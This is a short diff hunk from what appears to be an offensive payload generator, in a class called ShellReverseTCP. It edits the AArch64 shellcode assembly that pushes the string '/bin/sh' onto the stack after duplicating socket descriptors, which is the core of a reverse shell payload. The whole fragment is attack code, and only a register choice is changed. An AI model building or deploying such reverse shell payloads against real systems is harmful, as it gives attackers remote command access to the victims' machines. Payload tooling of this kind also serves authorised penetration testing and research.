@@ -75,11 +75,11 @@ class ShellReverseTCP(HatAsm, HatVenom, Words):
             cmp x1, xzr
             bne dup
 
-            mov x3, 0x622f
-            movk x3, 0x6e69, lsl 0x10
-            movk x3, 0x732f, lsl 0x20
-            movk x3, 0x68, lsl 0x30
-            str x3, [sp, -8]!
+            mov x1, 0x622f
+            movk x1, 0x6e69, lsl 0x10
+            movk x1, 0x732f, lsl 0x20
+            movk x1, 0x68, lsl 0x30
+            str x1, [sp, -8]!
             mov x1, xzr
             mov x2, xzr
             add x0, sp, x1
